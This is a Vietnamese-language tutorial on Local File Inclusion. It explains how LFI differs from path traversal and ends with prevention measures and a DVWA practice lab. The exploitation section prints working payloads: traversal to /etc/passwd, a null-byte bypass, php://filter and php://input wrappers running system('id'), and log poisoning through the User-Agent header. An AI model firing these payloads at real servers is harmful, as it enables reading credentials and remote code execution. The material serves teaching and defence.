# LFI (Local File Inclusion)

## 1. Định Nghĩa
- **Local File Inclusion (LFI)** là một lỗ hổng bảo mật web xảy ra khi ứng dụng không kiểm tra hoặc lọc dữ liệu đầu vào một cách chặt chẽ. LFI cho phép kẻ tấn công chỉ định đường dẫn tới các file trên máy chủ, dẫn đến việc tải hoặc thực thi các file đó.

---

## 2. Nguyên Nhân
- Ứng dụng chấp nhận dữ liệu đầu vào từ người dùng mà không kiểm tra đúng cách.
- Sử dụng các hàm như `include()`, `require()`, `include_once()` hoặc `require_once()` mà không lọc đầu vào.
- Thiếu các biện pháp bảo vệ như kiểm tra whitelist hoặc mã hóa đường dẫn.

---

## 3. Phân Biệt LFI và Path Traversal
### 3.1. Path Traversal
Path Traversal là một lỗ hổng bảo mật cho phép kẻ tấn công truy cập các file không được phép trên server bằng cách thay đổi đường dẫn file. Path Traversal thường chỉ cho phép đọc file mà không thực thi chúng.

Ví dụ:
```http
http://example.com/index.php?file=../../etc/passwd
```

### 3.2. Local File Inclusion (LFI)
LFI không chỉ cho phép truy cập file mà còn có khả năng thực thi nội dung file, đặc biệt khi ứng dụng sử dụng các hàm như `include()`. LFI có thể dẫn đến Remote Code Execution (RCE).

Ví dụ:
```http
http://example.com/index.php?page=../../var/log/apache2/access.log
```
Nếu kẻ tấn công đã chèn mã độc vào log file, mã này có thể được thực thi thông qua LFI.

| Tiêu Chí                  | Path Traversal                  | Local File Inclusion (LFI)       |
|---------------------------|---------------------------------|-----------------------------------|
| Mục tiêu chính            | Đọc file                        | Đọc và có thể thực thi file       |
| Hàm liên quan             | Không yêu cầu `include()`       | Yêu cầu các hàm như `include()`  |
| Mức độ nguy hiểm          | Cao                            | Rất cao                          |
| Ví dụ payload             | `../../etc/passwd`             | `../../var/log/apache2/access.log` |

---

## 4. Cách Khai Thác

### 4.1. Khai Thác Cơ Bản
Thay đổi giá trị tham số để tải các file nhạy cảm trên máy chủ:
```http
http://example.com/index.php?page=../../etc/passwd
```
- Payload `../../etc/passwd` sử dụng ký tự `../` để truy cập các thư mục cấp cao hơn.

### 4.2. Null Byte Injection
- Trong PHP < 5.3, ký tự null byte (`%00`) có thể bypass kiểm tra đuôi file:
```http
http://example.com/index.php?page=../../etc/passwd%00
```

### 4.3. Sử Dụng PHP Wrappers
- **Đọc file bằng `php://filter`**:
```http
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
- **Thực thi payload qua `php://input`**:
```http
POST /index.php?page=php://input

Payload:
<?php system('id'); ?>
```

### 4.4. Chèn Mã Vào Log Files
- Sử dụng `User-Agent` để chèn mã độc vào log server:
```http
User-Agent: <?php system('id'); ?>
```
- Sau đó, truy cập log file qua LFI:
```http
http://example.com/index.php?page=../../var/log/apache2/access.log
```

### 4.5. Khai Thác Session Files
- File session của PHP thường lưu tại `/var/lib/php/sessions/`.
- Sử dụng LFI để đọc hoặc chỉnh sửa session file:
```http
http://example.com/index.php?page=/var/lib/php/sessions/sess_<session_id>
```

---

## 5. Mục Tiêu Phổ Biến
- **Tệp cấu hình**:
  - `/etc/passwd`: Danh sách người dùng hệ thống.
  - `config.php`: File chứa thông tin cấu hình database.
- **Log Files**: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`.
- **Session Files**: `/var/lib/php/sessions/`.

---

## 6. Tác Động
- Đọc các file nhạy cảm như mật khẩu, cấu hình server.
- Thực thi mã độc trên server (Remote Code Execution).
- Lấy thông tin để thực hiện các cuộc tấn công khác, như privilege escalation.

---

## 7. Cách Phòng Chống
- **Kiểm tra và lọc dữ liệu đầu vào**:
  - Chỉ cho phép các file trong danh sách whitelist.
  - Sử dụng hàm `basename()` để lọc đường dẫn.

- **Mã hóa và kiểm tra đầu vào**:
  - Chặn các ký tự đặc biệt như `../`, `%00`.
  - Sử dụng hàm `realpath()` để xác minh đường dẫn.

- **Giới hạn quyền truy cập file**:
  - Chỉ cung cấp quyền truy cập tối thiểu cho các file cần thiết.
  - Tắt hiển thị lỗi (disable error messages).

- **Cấu hình server**:
  - Tắt `allow_url_include` và `allow_url_fopen` trong PHP.
  - Vô hiệu hóa các PHP wrappers không cần thiết.

---

## 8. Công Cụ Hỗ Trợ
- **Burp Suite**: Để intercept và test payloads.
- **FFUF**: Brute force các đường dẫn file nhạy cảm.
- **Dirb**: Tìm kiếm các file ẩn hoặc nhạy cảm trên server.

---

## 9. Thực Hành
### Môi Trường Thử Nghiệm
- **Docker LFI Lab**:
```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```

### Bài Tập Thực Hành
- HackTheBox: Challenges về LFI.
- TryHackMe: Module LFI.

---

## 10. Kết Luận
Local File Inclusion là một lỗ hổng nguy hiểm nhưng có thể phòng ngừa hiệu quả với các biện pháp kiểm tra đầu vào và cấu hình hệ thống an toàn. LFI và Path Traversal có sự khác biệt rõ rệt, trong đó LFI nguy hiểm hơn do khả năng thực thi mã độc. Việc hiểu rõ cơ chế và cách khai thác sẽ giúp bạn xây dựng các ứng dụng bảo mật hơn.
